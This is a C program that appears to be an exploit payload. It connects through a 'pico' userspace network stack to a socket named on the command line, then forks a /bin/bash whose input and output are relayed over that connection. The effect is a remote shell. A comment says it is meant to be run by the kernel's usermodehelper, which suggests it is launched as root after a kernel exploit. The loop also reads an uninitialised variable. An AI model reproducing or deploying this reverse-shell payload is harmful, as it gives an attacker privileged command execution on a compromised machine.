#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <poll.h>
#include <string.h>

#include "pico.h"
#include "utils.h"

union pipefds {
    struct {
        int read;
        int write;
    };
    int fds[2];
};

int main(int argc, char *argv[]) {
    union pipefds to_child;
    union pipefds from_child;
    char buff[1024];
    int size;
    struct pollfd pfd[1];
    int err;

    // make std* constistent when used as usemodehelper
    open("/dev/null", O_RDONLY);
    open("/dev/null", O_WRONLY);
    open("/dev/null", O_WRONLY);

    init_pico();

    if (argc != 2) return -1;

    // add leading zero byte
    char *path = calloc(1, strlen(argv[1]) + 2);
    strcpy(path + 1, argv[1]);

    if ((err = create_pico_client(path, strlen(argv[1]) + 2))) {
        mrklog("result: %d\n", err);
        return 1;
    }

    if (pipe(to_child.fds) == -1) return 1;
    if (pipe(from_child.fds) == -1) return 1;
    
    if (fork()) {
        close(to_child.read);
        close(from_child.write);
        pfd[0] = (struct pollfd) {
            .fd = from_child.read,
            .events = POLLIN,
        };
        while(size >= 0) {
            tick_pico_stack();
            poll(pfd, 1, 100);
            if (pfd[0].revents & POLLIN) {
                size = read(from_child.read, buff, 1024);
                using_color(COLOR_CYAN) {
                    printf("Sending back: \"\"\"\n");
                    fwrite(buff, size, 1, stdout);
                    printf("\"\"\"\n");
                }
                pico_sock_write(buff, size);
            }
            size = pico_sock_read(buff, 1024);
            if (size > 0) {
                using_color(COLOR_CYAN) {
                    printf("Received: ");
                    fwrite(buff, size, 1, stdout);
                }
                write(to_child.write, buff, size);
            }
        }
    } else {
        close(to_child.write);
        close(from_child.read);
        dup2(from_child.write, STDOUT_FILENO);
        dup2(from_child.write, STDERR_FILENO);
        dup2(to_child.read, STDIN_FILENO);
        
        execl("/bin/bash","/bin/bash", NULL);
        mrklog("failed to execl\n");
        return 1;  
    }
    
    free(path);
    return 0;
}